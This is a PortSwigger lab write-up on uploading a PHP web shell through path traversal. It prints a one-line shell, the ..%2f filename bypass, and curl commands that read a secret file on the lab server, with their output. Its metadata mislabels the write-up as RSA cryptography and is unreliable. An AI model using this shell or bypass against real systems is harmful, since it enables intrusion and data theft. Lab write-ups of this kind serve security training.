---
title: "fuv 3 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "path-traversal", "burp", "csrf", "fuv"]
summary: "crypto writeup for \"fuv 3\" from portswigger labs - techniques: wiener, path-traversal, burp, csrf, fuv."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-3/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-3/README.md"
ctf:
  name: "portswigger labs"
  challenge: "fuv 3"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** fuv 3
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-3/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/File-Upload-Vulnerabilities/fuv-3/README.md>

---
# Web shell upload via path traversal | Dec 16, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal), you'll learn: Web shell upload via path traversal! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216004515.png)

**Login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216004532.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216004538.png)

In the previous labs, we found the image upload function is vulnerable.

**Let's try to upload a PHP web shell, and intercept the request via Burp Suite:**
```php
<?php system($_GET['cmd']); ?>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216005114.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216005140.png)

When we clicked the `Upload` button, **it'll send a POST request to `/my-account/avatar`, with parameter `filename`, `user` and `csrf`. Also, the `Content-Type` is `application/x-php`.**

**Let's forward that request and see what will happened:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216005426.png)

The file has been uploaded!

**In the previous labs, we also knew that the uploaded file will lives in `/files/avatars/<filename>`.**

**Let's try to access that file!**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0ac0001c0460fe43c218d4c000c2006a.web-security-academy.net/files/avatars/webshell.php --get --data-urlencode "cmd=id"   
<?php system($_GET['cmd']); ?>
```

Hmm... Plain text??

Let's take a step back.

In the `upload` POST request, we see a parameter called `filename`.

**What if that parameter is vulnerable to path traversal, and change that value to `../webshell.php`?**

**This might put our uploaded web shell to `/files/webshell.php`!**

Let's try that:

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216010232.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216010242.png)

**File has been uploaded! Can we reach the web shell file??**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0ac0001c0460fe43c218d4c000c2006a.web-security-academy.net/files/webshell.php --get --data-urlencode "cmd=id"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 0be9fd0d8348 Port 80</address>
</body></html>
```

Still no...

**Hmm... What if the application is stripping the `/` or it's doing double URL encoding?**

**To bypass that, I'll URL encode the `/`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216010629.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-3/images/Pasted%20image%2020221216010643.png)

**Now it treats the `%2f` as the `/`!**

**And can we reach the web shell file?**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0ac0001c0460fe43c218d4c000c2006a.web-security-academy.net/files/webshell.php --get --data-urlencode "cmd=id"
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

**Yes we can! Let's `cat` the `secret` file:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/File-Upload-Vulnerabilities/FUV-2]
└─# curl https://0ac0001c0460fe43c218d4c000c2006a.web-security-academy.net/files/webshell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
Y03cdrRe1Gc4ehqVfzbsTujvCCyf8TVc
```

# What we've learned:

1. Web shell upload via path traversal
